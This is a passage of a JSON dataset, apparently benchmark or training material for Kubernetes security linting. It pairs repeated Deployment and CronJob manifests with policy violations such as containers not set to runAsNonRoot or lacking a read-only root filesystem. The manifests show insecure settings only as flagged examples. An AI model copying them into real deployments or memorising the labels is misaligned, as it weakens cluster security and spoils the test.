    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.1.4\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.1.4\n        app.kubernetes.io/version: latest\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: gcr.io/jenkinsxio/jx-pipelines-visualizer:1.1.4\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jx-pipelines-visualizer\" is not set to runAsNonRoot"
  },
  {
    "id": "10275",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "10276",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "10277",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "10278",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "10279",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r2.3.1-retinanet-conv-v2-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "10280",
    "manifest_path": "data/manifests/the_stack_sample/sample_3967.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r2.3.1-retinanet-conv-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 2.3.1\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 22500\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:r2.3.1\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v2: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r2.3.1/retinanet/conv/v2-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   